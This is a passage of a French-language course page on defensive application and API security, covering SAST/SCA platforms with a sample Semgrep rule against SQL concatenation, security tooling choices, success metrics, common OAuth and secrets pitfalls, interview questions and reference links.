Le tableau des [outils de test de sécurité](#les-outils-de-test-de-securite) présente chaque technique seule. Le <span class="term" data-term="sca">SCA</span> (*Software Composition Analysis*) élargit le scan de dépendances : failles connues, licences, dépendances indirectes, inventaire des composants (SBOM). Une **plateforme** réunit <span class="term" data-term="sast">SAST</span>, SCA, scan de secrets, d'images de conteneur et de code d'infrastructure, avec un tableau de bord commun, la suppression des doublons, le tri par risque et des commentaires dans les merge requests.

!!! noob "As noob"
    Le SAST relit mon propre code, comme un correcteur relit ma copie ; le SCA vérifie les pièces achetées à l'extérieur (les bibliothèques), comme un garagiste qui consulte la liste des rappels du constructeur. La phrase à retenir : **SAST pour le code que j'écris, SCA pour le code que j'importe.**

| Exemple | Point de départ | À retenir |
|---|---|---|
| SonarQube | qualité du code, puis règles de sécurité (SAST) | souvent déjà en place pour la qualité ; SCA ajouté récemment selon les éditions (à vérifier) |
| Semgrep | SAST par règles écrites comme du code | moteur open source, règles faciles à écrire soi-même ; plateforme payante au-dessus |
| Snyk | SCA, puis SAST (Snyk Code) et conteneurs | forte base de failles, priorisation par exploitabilité (à vérifier) |
| Aikido | tout-en-un pour petites et moyennes équipes | réunit plusieurs scanners open source avec un tri commun (à vérifier) |

**Quand** : plus d'une poignée de dépôts, plusieurs scanners qui sortent chacun leur liste, et personne ne sait quelles failles sont vraiment ouvertes. **Pas encore** : un ou deux dépôts, où `pip-audit`, gitleaks et un linter de sécurité dans la CI couvrent l'essentiel gratuitement.

**Pourquoi** : sans tri, un premier scan sort des centaines de constats, et l'équipe apprend à les ignorer. La plateforme réduit le bruit : doublons fusionnés, failles classées selon que le code vulnérable est réellement appelé, score d'exploitation (<span class="term" data-term="epss">EPSS</span>). Le coût : une licence souvent par développeur, et du temps de tri.

**Comment** :

1. lancer la plateforme en mode non bloquant sur tous les dépôts, pour mesurer ;
2. bloquer la merge request seulement sur les **nouveaux** constats critiques (le code ajouté), pas sur l'historique ;
3. traiter l'historique par lots, du plus exploitable au moins exploitable ;
4. écrire quelques règles maison pour les erreurs propres au projet.

Le parcours d'un constat, de la détection à la vérification. Un « risque accepté » porte toujours une date de réexamen, sinon il devient une faille oubliée :

```mermaid
stateDiagram-v2
  state "Détectée" as D
  state "Triée" as T
  state "Faux positif" as FP
  state "Risque accepté, avec échéance" as RA
  state "À corriger" as C
  state "Corrigée" as F
  state "Vérifiée" as V
  [*] --> D: scan en CI ou nouvelle CVE
  D --> T: gravité, EPSS, code appelé
  T --> FP: pas exploitable ici
  T --> RA: pas de correctif, impact faible
  T --> C: exploitable
  C --> F: mise à jour ou correctif en MR
  F --> V: nouveau scan vert
  RA --> T: échéance atteinte
  FP --> [*]
  V --> [*]
```

Une règle Semgrep maison qui repère une requête SQL construite par concaténation (voir [l'injection SQL](sql.md#securite-linjection-sql)) :
```yaml
# Exemple : règle Semgrep qui signale une requête SQL construite par concaténation
rules:
  - id: sql-string-concat
    languages: [python]
    severity: ERROR
    message: Requête SQL construite par concaténation, utiliser une requête paramétrée
    pattern: $DB.execute("..." + $X)
```

:material-book-open-variant: Doc de référence : [OWASP, Source Code Analysis Tools](https://owasp.org/www-community/Source_Code_Analysis_Tools) (consultée en novembre 2026) ; [Semgrep, documentation](https://semgrep.dev/docs/) (consultée en novembre 2026)
{ .doc-ref }

### Quel outil, pour qui, quand

| Outil | Qui le porte | Je l'adopte quand | J'attends si |
|---|---|---|---|
| SIEM | équipe sécurité ou SOC | j'ai plusieurs systèmes dont il faut relier les traces, comme des échecs de connexion sur my-api suivis d'un gros export, ou une obligation de détection | personne ne peut trier les alertes ; je commence alors par les journaux d'audit du cloud et trois ou quatre alertes bien choisies |
| NDR | équipe sécurité et réseau | j'ai mon propre réseau avec beaucoup de machines que je ne contrôle pas finement, comme des postes, des objets connectés ou des serveurs anciens | tout est managé ou serverless, donc il y a peu de réseau à moi à observer et les journaux du cloud suffisent souvent |
| CrowdSec | équipe plateforme | mon service exposé sur internet reçoit de la force brute et des scans, comme des robots qui testent `/wp-admin` | mes clients sont derrière des IP partagées, comme un réseau d'entreprise, et je n'ai pas de liste d'exceptions : bloquer une IP bloquerait des centaines de vrais utilisateurs |
| CSPM, Cloud Custodian | plateforme et sécurité | j'ai plusieurs comptes cloud et des gens changent des choses à la main dans la console, comme un bucket laissé public | j'ai un seul projet, entièrement en IaC et relu en revue : un scan du code Terraform suffit au début |
| Steampipe | plateforme, sécurité, FinOps | on me pose une question d'inventaire ponctuelle, comme « quels buckets sont publics ? », et je veux répondre en SQL sans écrire de script | l'inventaire natif du cloud, comme AWS Config, répond déjà à la question |
| gestionnaire de secrets applicatif | plateforme, chaque application | dès que du code lit un premier secret, comme le mot de passe de base de données dont mon application a besoin pour démarrer | jamais : c'est le minimum |
| gestionnaire de mots de passe | chaque personne, chaque équipe | dès que des humains partagent un accès, comme la console d'un fournisseur ou un compte de démonstration | jamais : c'est le minimum |
| plateforme SAST et SCA | équipes de développement | j'ai beaucoup de dépôts, plusieurs scanners qui sortent chacun leur liste, et plus personne ne sait quelles failles sont vraiment ouvertes | j'ai un ou deux dépôts, où `pip-audit`, gitleaks et un linter de sécurité dans la CI couvrent l'essentiel gratuitement |

!!! maturity "Mesurer la maturité"
    | Niveau | Ce que j'observe dans l'équipe |
    |---|---|
    | N1 | les journaux d'audit du cloud sont activés, et quelqu'un les consulte après un incident |
    | N2 | les journaux de sécurité structurés partent vers un SIEM, un CSPM vérifie la configuration du cloud, et les secrets des machines comme des humains sont dans des gestionnaires |
    | N3 | des règles de corrélation alertent seules, CrowdSec bloque les attaquants connus, et Cloud Custodian retire l'accès public d'un bucket sans attendre un humain |
    | N4 | l'équipe suit le délai de détection et de réponse, le taux de faux positifs par règle et les constats CSPM ouverts, et retire ou affine ses règles d'après ces chiffres |

    **Je mesure** : le délai médian entre le début d'un incident et sa détection, lu dans les rapports d'incident ; la part des alertes SIEM fermées comme faux positifs, lue dans l'outil de tri.

## Mesurer le succès

Je sais que ces mesures de sécurité marchent quand le temps pendant lequel je suis exposé baisse, pas quand le nombre d'outils monte. Avant de changer, je note une base sur un trimestre : par exemple, le délai médian de correction d'une faille critique, la part des routes couvertes par un test de refus et l'âge du plus vieux secret. Je reprends les mêmes mesures le trimestre suivant. La métrique garde-fou est la friction : un taux d'échec de connexion qui grimpe, ou des livraisons bloquées par des faux positifs, disent que la sécurité gêne plus qu'elle ne protège.

| Solution ou situation | Indicateur de succès (SLI) | SLO probable | SLA probable |
|---|---|---|---|
| fournisseur d'identité et connexion OIDC | part des connexions qui aboutissent sans erreur du serveur | 99,95 % par mois | 99,9 % par mois, souvent l'engagement du fournisseur hébergé envers moi (à vérifier dans son contrat) |
| correction des failles des dépendances (SCA) | délai entre la publication d'une CVE critique qui me touche et le correctif en production | 95 % en moins de 7 jours | correctif en moins de 30 jours dans le contrat des clients entreprise, un engagement que leurs questionnaires de sécurité demandent souvent |
| tests de refus (BOLA, jeton expiré) | part des routes couvertes par un test de refus | 100 % des routes qui lisent les données d'un utilisateur | sans objet : pas de contrat externe |
| gestionnaire de secrets et rotation | âge du plus vieux secret encore valide | aucun secret de plus de 90 jours | sans objet : pas de contrat externe |
| détection par SIEM | délai entre le début d'un incident et sa détection | 90 % des incidents détectés en moins de 24 h | client prévenu d'une violation de données en moins de 72 h après sa découverte, calé sur le délai que le RGPD impose envers l'autorité de contrôle (article 33) |
| demandes RGPD (accès, effacement) | délai de traitement d'une demande | 95 % en moins de 15 jours | un mois, le délai légal du RGPD (article 12), qui joue ici le rôle de la promesse sanctionnée |
| zero trust entre services | part du trafic entre services en mTLS strict | 100 % des services de production | sans objet : pas de contrat externe |

[À prendre avec précaution : ordres de grandeur d'exemple, à fixer avec le métier]

!!! noob "As noob"
    Le SLO, c'est le délai que je me donne pour rendre un dossier, en gardant une semaine de marge ; le SLA, c'est la date limite écrite dans le contrat, avec une pénalité de retard. Je vise toujours mon délai à moi, pour que l'imprévu tombe dans la marge et pas dans la pénalité. La phrase à retenir : **le SLO est ma cible interne, le SLA est la promesse plus lâche faite au client, avec une pénalité.**

## Pièges à éviter

- **ID token envoyé à l'API** : j'envoie l'ID token à l'API à la place de l'access token, alors qu'il est fait pour l'application cliente et ne donne aucun droit sur une API. J'envoie toujours l'access token à l'API, et je garde l'ID token pour savoir qui est connecté ([voir OIDC](#openid-connect-oidc-savoir-qui-est-connecte)).
- **Donnée sensible dans un JWT** : je mets une information confidentielle dans le contenu du jeton, alors qu'un JWT est signé mais pas chiffré : n'importe qui la lit en le collant dans jwt.io. Je n'y mets que des identifiants et des droits ([voir JWT](#jwt-a-quoi-ressemble-un-jeton)).
- **Garder les flux Implicit ou Password** : je laisse ma SPA recevoir le jeton dans l'URL, ou mon appli demander le mot de passe dans son propre formulaire. Le jeton fuit dans l'historique, les logs et le Referer, et l'appli voit des mots de passe qu'elle ne devrait jamais voir. J'utilise Authorization Code + PKCE pour toute connexion d'une personne ([voir ce qui change avec OAuth 2.1](#ce-qui-change)).
- **Oublier l'audience** : je demande un jeton à Auth0 sans `audience`, et je reçois un jeton que mon API ne sait pas exploiter, donc chaque appel est refusé. Je précise toujours l'audience de l'API visée ([voir le rôle de l'audience](#le-role-de-laudience)).
- **Secret commité « mais le dépôt est privé »** : je pousse une clé d'API dans Git en me disant que personne ne la verra. Elle est dans chaque clone et dans l'historique pour toujours. Je la révoque et j'en génère une nouvelle tout de suite, et je mets gitleaks en hook pre-commit ([voir les secrets](#les-secrets)).
- **Compter sur CORS pour protéger l'API** : je crois qu'une liste d'origines autorisées empêche les appels non voulus, alors que `curl` ou un script ignorent CORS complètement. Je vérifie l'authentification et les droits côté serveur, sur chaque route ([voir CORS](#cors-la-requete-de-pre-verification)).
- **DCR ouvert sans contrôle** : je laisse l'enregistrement dynamique actif alors que je n'en ai pas besoin. N'importe qui peut créer une appli « Outil RH officiel » et obtenir un jeton au nom d'ada. Je le désactive, ou je passe aux CIMD ([voir pourquoi c'est un souci](#pourquoi-cest-un-souci)).
- **Pas de test BOLA** : je teste qu'ada voit ses commandes, mais jamais qu'elle ne voit pas celles de grace. Le jour où une route oublie le contrôle, ada lit la commande 43 en changeant l'URL. J'écris un test de refus par route ([voir les failles courantes](#les-failles-les-plus-courantes-des-api)).

## Ce qu'on demande en entretien

Les questions typiques :

- « Quelle différence entre authentification et autorisation ? », « 401 ou 403 ? » Pour répondre : je donne la définition en une phrase chacune, puis le code HTTP qui va avec : 401 quand je ne sais pas qui appelle, 403 quand je le sais mais qu'il n'a pas le droit ([Vocabulaire](#vocabulaire), et [Les codes de réponse](api-rest-async.md#les-codes-de-reponse)).
- « Explique OAuth 2.0 », « Quel flux pour une SPA, une appli mobile, un batch ? », « Pourquoi le flux Implicit et le flux Password sont-ils abandonnés ? » Pour répondre : je dessine Authorization Code + PKCE, puis je dis quel flux va avec quel client et ce qu'OAuth 2.1 a retiré ([Les flux OAuth](#les-flux-oauth), [Ce qui change avec OAuth 2.1](#ce-qui-change)).
- « Qu'y a-t-il dans un JWT, et que doit vérifier l'API ? », « Qu'est-ce qu'un bearer token, et quel est son risque ? » Pour répondre : je cite `iss`, `aud`, `exp`, `scope` et la signature, puis je montre comment DPoP rend un jeton volé inutile ([JWT](#jwt-a-quoi-ressemble-un-jeton), [DPoP](#dpop-un-jeton-qui-ne-sert-qua-son-proprietaire)).
- « Comment testes-tu la sécurité d'une API ? », « Qu'est-ce que le BOLA ? », « CSRF, XSS, CORS : quelle différence ? » Pour répondre : je pars de l'OWASP API Security Top 10 et je donne le test de refus de chaque faille ([Les failles les plus courantes des API](#les-failles-les-plus-courantes-des-api), [CSRF et cookies SameSite](#csrf-et-cookies-samesite)).
- « Comment gères-tu les secrets ? », « Une clé a fuité, que fais-tu ? », « Comment stocker un mot de passe ? » Pour répondre : je parle gestionnaire de secrets, révocation immédiate et Argon2id ([Les secrets](#les-secrets), [Stocker un mot de passe](#stocker-un-mot-de-passe)).
- « As-tu déjà fait une modélisation des menaces ? », « Qu'est-ce que le zero trust ? » Pour répondre : je déroule STRIDE sur un petit schéma, puis l'idée qu'être dans le réseau ne prouve rien ([Modéliser les menaces : STRIDE](#modeliser-les-menaces-stride), [Zero trust et identité entre services](#zero-trust-et-identite-entre-services), et [NIST SP 800-207](textes-fondateurs.md#nist-sp-800-207-zero-trust-architecture-2020)).
- « RBAC ou ABAC ? », « Où vérifies-tu les droits ? », « Comment choisis-tu une bibliothèque externe ? » Pour répondre : les rôles pour quelques profils stables, les attributs quand la règle dépend des données (pays, montant, propriétaire), les relations à la Zanzibar pour du partage ; la décision toujours côté serveur, dans le service, en refus par défaut ; pour une dépendance, je déroule besoin, dépendances transitives, licence, signes de maintenance et OpenSSF Scorecard ([Modéliser les droits : RBAC, ABAC, ReBAC](#modeliser-les-droits-rbac-abac-rebac), [Où appliquer les contrôles](#ou-appliquer-les-controles), [Choisir une dépendance](#choisir-une-dependance)).
- « Comment sais-tu que ta sécurité s'améliore ? » Pour répondre : je cite un SLI de temps d'exposition (délai de correction d'une faille critique, âge des secrets), une base sur un trimestre, la même mesure le trimestre suivant, la friction comme garde-fou, puis un SLO interne plus strict que l'engagement signé avec les clients ([Mesurer le succès](#mesurer-le-succes)).

Ce qui fait une bonne réponse : relier chaque mécanisme à l'attaque qu'il empêche (« PKCE, parce qu'un code intercepté ne doit servir à rien »), puis dire comment je le vérifie par un test de refus.

## Quoi utiliser dans quelle situation

| Situation | J'utilise |
|---|---|
| ada doit pouvoir se connecter à mon appli, sur le site comme sur le téléphone | <span class="term" data-term="openid-connect">OIDC</span>, Authorization Code + <span class="term" data-term="pkce">PKCE</span>, chez un fournisseur d'identité |
| un service doit appeler une API sans personne derrière, comme un batch nocturne qui lit les commandes | Client Credentials, jeton réutilisé jusqu'à expiration |
| je veux qu'un jeton volé, par exemple retrouvé dans un log, serve le moins longtemps et le moins possible | jetons courts, rotation des refresh tokens, <span class="term" data-term="dpop">DPoP</span> |
| je veux qu'un client trouve tout seul les adresses du fournisseur d'identité, sans qu'on les lui recopie à la main | métadonnées `/.well-known/...` |
| des clients que je ne connais pas à l'avance doivent pouvoir se connecter, comme des assistants IA qui se branchent sur mon serveur MCP | <span class="term" data-term="cimd">CIMD</span> de préférence, sinon <span class="term" data-term="dcr">DCR</span> contrôlé |
| toutes mes applications clientes sont connues et créées à la main par un administrateur, donc je n'ai pas besoin d'enregistrement dynamique | DCR désactivé |
| je veux être sûr qu'ada ne peut pas voir la commande de grace en changeant l'identifiant dans l'URL | un test <span class="term" data-term="bola">BOLA</span> par route |
| un secret a fuité, par exemple une clé d'API poussée par erreur dans un dépôt | le révoquer et en générer un nouveau, tout de suite |
| mon appli gère elle-même la connexion et devrait garder les mots de passe de ses utilisateurs | ne pas le faire, sinon Argon2id ou bcrypt |
| j'ajoute une entrée externe, comme un envoi de fichiers, ou mon service commence à manipuler des données sensibles | une modélisation des menaces d'une heure : schéma de flux, grille <span class="term" data-term="stride">STRIDE</span>, un test par mesure |
| mes services s'appellent entre eux dans un cluster, comme orders-service qui appelle payments-service, et un seul service piraté ne doit pas ouvrir l'accès à tous les autres | <span class="term" data-term="zero-trust">zero trust</span> : identité <span class="term" data-term="spiffe">SPIFFE</span>, <span class="term" data-term="mtls">mTLS</span>, politiques en refus par défaut |
| mes services partagent la même clé d'API, donc une seule clé volée ouvre tout | la remplacer par une identité de charge de travail, puis la révoquer |
| mon équipe veut ajouter un champ personnel, comme la date de naissance du client | une finalité, une durée de conservation, sinon ne pas le collecter |
| d'autres services ont besoin de savoir de quel client il s'agit, comme billing-service qui facture une commande | ne leur transmettre que `customer_id` (<span class="term" data-term="pseudonymization">pseudonymisation</span>) |
| ada demande l'effacement de ses données, mais elles sont aussi dans un journal d'événements qu'on ne réécrit pas | <span class="term" data-term="crypto-shredding">crypto-shredding</span>, à valider avec le DPO |
| les données de mes clients doivent rester dans l'UE, y compris dans les logs, le support et les services managés annexes | région européenne, sous-traitants listés, transferts vérifiés |
| une attaque laisse des traces dans plusieurs systèmes, comme des échecs de connexion sur my-api puis un gros export, et je veux les relier | un SIEM, alimenté par des journaux de sécurité structurés |
| un attaquant est peut-être déjà entré sur mon propre réseau, et il ne laisse rien dans les journaux applicatifs | une détection réseau (NDR) : Zeek, Suricata ou un produit commercial |
| mon service exposé sur internet reçoit des rafales d'essais de mots de passe et des robots qui testent `/wp-admin` | un IPS collaboratif comme CrowdSec, en plus de la limitation de débit |
| des gens créent des ressources cloud à la main dans la console, hors des règles, comme un bucket laissé public | un CSPM ou des politiques Cloud Custodian, d'abord en `--dryrun` |
| on me demande vite « quels buckets sont publics ? » et je ne veux pas écrire de script | un inventaire en SQL (Steampipe) ou l'inventaire natif du cloud |
| mon application a besoin d'un mot de passe de base de données pour démarrer | un gestionnaire de secrets, idéalement des secrets dynamiques |
| plusieurs personnes de l'équipe doivent partager un accès, comme la console d'un fournisseur ou un compte de démonstration | un gestionnaire de mots de passe d'équipe |
| mes scanners sortent des centaines de constats sur beaucoup de dépôts, et plus personne ne sait lesquels sont vraiment ouverts | une plateforme SAST et SCA, bloquante seulement sur le nouveau code |
| mon back-office distingue quelques profils stables, comme client, agent de support et administrateur | RBAC : des rôles et une table de permissions |
| un agent de support ne doit rembourser que les commandes de son pays, sous un plafond | ABAC : une règle sur les attributs, dans un moteur de politiques si elles se multiplient |
| mes utilisateurs partagent des documents ou des dossiers entre eux, avec héritage des droits | ReBAC (modèle Zanzibar) : OpenFGA, SpiceDB |
| je dois ajouter une bibliothèque externe, comme une bibliothèque de génération de PDF | la grille : besoin, dépendances transitives, licence, maintenance, OpenSSF Scorecard |

## Pour aller plus loin
- [Bearer of Good News : OAuth 2.0 to 2.1](https://bearer.sambego.tech/) : une présentation sur le passage d'OAuth 2.0 à 2.1 (date de publication non indiquée).
- [Le brouillon OAuth 2.1 à l'IETF (version 16, septembre 2026)](https://datatracker.ietf.org/doc/draft-ietf-oauth-v2-1/)
- [RFC 9449 : DPoP (septembre 2023)](https://www.rfc-editor.org/rfc/rfc9449)
- [Spécification MCP : enregistrement des clients (révision du 28 juillet 2026)](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration)
- [OWASP API Security Top 10, édition 2023](https://owasp.org/API-Security/)
- [Adam Shostack, Threat Modeling: Designing for Security (2014)](https://shostack.org/books/threat-modeling-book)
- [Threat Modeling Manifesto (2020)](https://www.threatmodelingmanifesto.org/)
- [OWASP Threat Modeling Cheat Sheet (date de publication non indiquée)](https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html)
- [Zanzibar: Google's Consistent, Global Authorization System, USENIX ATC (juillet 2019)](https://www.usenix.org/conference/atc19/presentation/pang)
- [OpenSSF Scorecard (projet lancé en 2020)](https://github.com/ossf/scorecard)
- [NIST SP 800-207, Zero Trust Architecture (août 2020)](https://csrc.nist.gov/pubs/sp/800/207/final)
- [SPIFFE : présentation du projet (date de publication non indiquée)](https://spiffe.io/docs/latest/spiffe-about/overview/)
- [RFC 8693 : OAuth 2.0 Token Exchange (janvier 2020)](https://www.rfc-editor.org/rfc/rfc8693)
- [RFC 8705 : jetons liés au certificat mTLS (février 2020)](https://www.rfc-editor.org/rfc/rfc8705)
- [RGPD, règlement (UE) 2016/679, texte officiel (avril 2016)](https://eur-lex.europa.eu/eli/reg/2016/679/oj)
- [CEPD, lignes directrices 4/2019 sur l'article 25, version 2.0 (octobre 2020)](https://www.edpb.europa.eu/our-work-tools/our-documents/guidelines/guidelines-42019-article-25-data-protection-design-and_en)
- [NIST SP 800-92, Guide to Computer Security Log Management (septembre 2006)](https://csrc.nist.gov/pubs/sp/800/92/final)
- [Sigma, format générique de règles de détection (projet ouvert, date de publication non indiquée)](https://github.com/SigmaHQ/sigma)
- [Documentation de Zeek (date de publication non indiquée, à vérifier)](https://docs.zeek.org/)
- [Documentation de CrowdSec (date de publication non indiquée, à vérifier)](https://docs.crowdsec.net/)
- [Documentation de Cloud Custodian (date de publication non indiquée, à vérifier)](https://cloudcustodian.io/docs/)
- [Documentation de Steampipe (date de publication non indiquée, à vérifier)](https://steampipe.io/docs)
- [HashiCorp Vault, secrets dynamiques de base de données (date de publication non indiquée, à vérifier)](https://developer.hashicorp.com/vault/docs/secrets/databases)
- [Documentation de Semgrep, écriture de règles (date de publication non indiquée, à vérifier)](https://semgrep.dev/docs/writing-rules/overview)
- [RFC 5737 : adresses IPv4 réservées à la documentation (janvier 2010)](https://www.rfc-editor.org/rfc/rfc5737)
